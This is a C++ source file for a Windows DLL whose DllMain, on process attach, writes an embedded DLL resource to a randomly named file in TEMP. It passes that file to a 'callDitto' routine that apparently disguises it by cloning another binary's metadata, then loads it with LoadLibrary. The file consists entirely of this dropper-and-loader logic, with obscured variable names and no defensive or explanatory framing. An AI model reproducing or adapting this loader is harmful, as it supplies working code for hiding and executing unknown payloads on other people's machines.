// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

#include "main-ditto.h"

#include <ctime>

char F12016[ MAX_PATH ];
char F12016s[ MAX_PATH ];

bool extractResource(const HINSTANCE hInstance, WORD resourceID, LPCTSTR szFilename)
{
	bool bSuccess = false;
	try
	{
		// Find and load the resource
		HRSRC hResource = FindResource(hInstance, MAKEINTRESOURCE(resourceID), "DLL");
		HGLOBAL hFileResource = LoadResource(hInstance, hResource);

		// Open and map this to a disk file
		LPVOID lpFile = LockResource(hFileResource);
		DWORD dwSize = SizeofResource(hInstance, hResource);

		// Open the file and filemap
		HANDLE hFile = CreateFile(szFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		HANDLE hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwSize, NULL);
		LPVOID lpAddress = MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, 0);

		// Write the file
		CopyMemory(lpAddress, lpFile, dwSize);

		// Un-map the file and close the handles
		UnmapViewOfFile(lpAddress);
		CloseHandle(hFileMap);
		CloseHandle(hFile);
		bSuccess = true;
	}
	catch(...)
	{
		MessageBox(NULL, "Failed to load dll!", NULL, NULL);
	}
	return bSuccess;
}

std::string random_string(size_t length)
{
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		
		const size_t max_index = ( sizeof(charset)-1 );
		return charset[rand()%max_index];
	};
	std::string str(length, 0);
	srand(time(NULL));
	std::generate_n(str.begin(), length, randchar);
	return str;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

		memset(F12016, 0, sizeof(F12016));

		if(1 != 0)
		{
			auto *temp = getenv("TEMP");
			strcpy_s(F12016, temp);
			strcat_s(F12016, "\\");

			size_t slash = -1;

			for(size_t i = 0; i < strlen(F12016); i++)
			{
				if(F12016[ i ] == '/' || F12016[ i ] == '\\')
				{
					slash = i;
				}
			}

			if(slash != -1)
			{
				F12016[ slash + 1 ] = '\0';
				strcpy_s(F12016s, F12016);
				strcat_s(F12016, random_string(25).c_str());
				strcat_s(F12016s, (random_string(26) + ".dll").c_str());
			}
			else
			{
				MessageBoxA(NULL, "Unable to parse target module path", "ERROR", MB_OK);
				ExitProcess(0);
			}
		}
		else
		{
			MessageBoxA(NULL, "GetModuleFileNameA failed", "ERROR", MB_OK);
			ExitProcess(0);
		}

		extractResource(hModule, IDR_DLL1, F12016);
		callDitto(F12016, F12016s);
		LoadLibrary(F12016s);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

